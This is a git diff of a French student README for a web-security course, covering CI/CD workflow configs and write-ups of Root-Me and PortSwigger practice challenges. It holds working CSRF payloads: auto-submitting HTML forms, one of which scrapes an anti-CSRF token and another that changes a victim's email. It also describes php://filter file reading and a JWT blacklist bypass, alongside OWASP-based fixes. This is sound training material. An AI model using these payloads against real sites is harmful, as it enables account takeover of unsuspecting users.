@@ -1,6 +1,7 @@
 # Projet Sécurité du Web
 
 ## Membres du groupes
+
 - LOUNADI Nassim
 - DEHIL Sami
 - BATISTA Maxime
@@ -68,16 +69,15 @@ jobs:
       - name: trivy FS mode
         uses: aquasecurity/trivy-action@0.33.1
         with:
-          scan-type: 'fs'
-          format: 'sarif'
-          output: 'results.sarif'
-          severity: 'CRITICAL,HIGH'
+          scan-type: "fs"
+          format: "sarif"
+          output: "results.sarif"
+          severity: "CRITICAL,HIGH"
 
       - name: upload
         uses: github/codeql-action/upload-sarif@v4
         with:
           sarif_file: results.sarif
-
 ```
 
 ## CD.yml
@@ -120,8 +120,6 @@ jobs:
           file: ./Dockerfile
           push: true
           tags: ${{ secrets.DOCKER_USERNAME }}/ci-cd:latest
-
-
 ```
 
 ## Challenges
@@ -158,7 +156,7 @@ Utilisation du filtre 'php://filter/convert' avec base64-encode pour lire le cod
 
 ![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/2.png)
 
-Même principe pour lire le fichier login : 
+Même principe pour lire le fichier login :
 
 ![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/3.png)
 
@@ -196,36 +194,46 @@ Payload :
 
 ```html
 <html>
-    <form id="profile" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="post" enctype="multipart/form-data">
-        <div>
-            <label>Username:</label>
-            <input id="username" type="text" name="username" value="change_me_user">
-        </div>
-        <br>		
-        <div>
-            <label>Status:</label>
-            <input id="status" type="checkbox" name="status" checked>
-        </div>
-        <br>
-        <input id="token" type="hidden" name="token" value="" />
-        <button type="submit">Submit</button>
-    </form>
+  <form
+    id="profile"
+    action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
+    method="post"
+    enctype="multipart/form-data"
+  >
+    <div>
+      <label>Username:</label>
+      <input id="username" type="text" name="username" value="change_me_user" />
+    </div>
+    <br />
+    <div>
+      <label>Status:</label>
+      <input id="status" type="checkbox" name="status" checked />
+    </div>
+    <br />
+    <input id="token" type="hidden" name="token" value="" />
+    <button type="submit">Submit</button>
+  </form>
 
-    <script>
-        const request = new XMLHttpRequest();
-        request.open('GET', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
-        request.send();
+  <script>
+    const request = new XMLHttpRequest();
+    request.open(
+      "GET",
+      "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile",
+      false
+    );
+    request.send();
 
-        const token = (request.responseText.match(/name="token" value="([a-zA-Z0-9]+)"/))[1];
+    const token = request.responseText.match(
+      /name="token" value="([a-zA-Z0-9]+)"/
+    )[1];
 
-        const tokenField = document.getElementById('token')
-        tokenField.setAttribute('value', token)
+    const tokenField = document.getElementById("token");
+    tokenField.setAttribute("value", token);
 
-        const form = document.getElementById('profile');
-        form.submit();
-    </script>
+    const form = document.getElementById("profile");
+    form.submit();
+  </script>
 </html>
-
 ```
 
 Attendre le passage de l'administrateur sur la demande de contact :
@@ -237,7 +245,67 @@ Comme "DOMPurify.sanitize(payload)"
 
 ![Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)
 
-### 4 | JWT Jeton révoqué
+### 4 | CSRF where token is not tied to user session
+
+Capture de la requête de mise à jour de l'email dans Burp :
+
+![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/1.png)
+
+On garde le token CSRF de coté.
+
+On va maintenant venir se connecter avec le 2ème compte fourni sur une autre fenêtre en navigation privée pour s'assurer d'être sur une autre session.
+
+On intercepte à nouveau notre requête de mise à jour de l'email avec le nouveau compte
+
+![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/2.png)
+
+Pour s'assurer que le token CSRF n'est pas lié a la session, on va venir modifier notre requête dans le Repeater de Burp.
+
+![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/3.png)
+
+Ici, on modifie l'email et le token avec celui qu'on à gardé sous le coude un peu plus tôt et on soumet la requête.
+
+![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/4.png)
+
+La requête passe correctement, on peut donc en déduire que le token CSRF n'est pas lié à la session de l'utilisateur
+
+![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/5.png)
+
+Pour résoudre la challenge, on va donc dans "Go to exploit server"
+
+Dans la partie "Body", on applique ce code récupéré depuis la page de mise à jour de l'email :
+
+```html
+<html>
+  <body>
+    <form
+      class="login-form"
+      name="change-email-form"
+      action="https://0a5d00b6043c301280dc030300e8009c.web-security-academy.net/my-account/change-email"
+      method="POST"
+    >
+      <label>Email</label>
+      <input type="hidden" name="email" value="victime@pwned.com" />
+      <input
+        type="hidden"
+        name="csrf"
+        value="HcWGTMjAD6bjaukJQhqU5PYODOZO8Atq"
+      />
+      <!-- CSRF de l'autre user, non consommé par le serveur -->
+      <button type="submit" value="Submit" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/6.png)
+
+### 5 |
+
+### 6 | JWT Jeton révoqué
 
 Après avoir testé plusieurs payloads, d'avoir changé d'encodage, j'ai finalement essayé de changer le token en lui même (vu que la blacklist l'identifie en dur).
 
@@ -253,9 +321,9 @@ Récupération d'un token valide avec l'utilisateur admin :
 
 La signature est tronquée et a pour longueur 43
 
-3 * 14 = 42
+3 \* 14 = 42
 
-3 * 15 = 45
+3 \* 15 = 45
 
 Ajout de 1 ou 2 "=" à la fin du token :
 
@@ -264,10 +332,6 @@ Ajout de 1 ou 2 "=" à la fin du token :
 Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser une bibliothèque officielle pour la gestion des JWT, ou d'utiliser une white liste, ou simplement strip les "=" des tokens récupérer via les requêtes utilisateurs.
 
 [Source](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3)
-
-### 5 |
-
-### 6 |
 
 ### 7 |
 
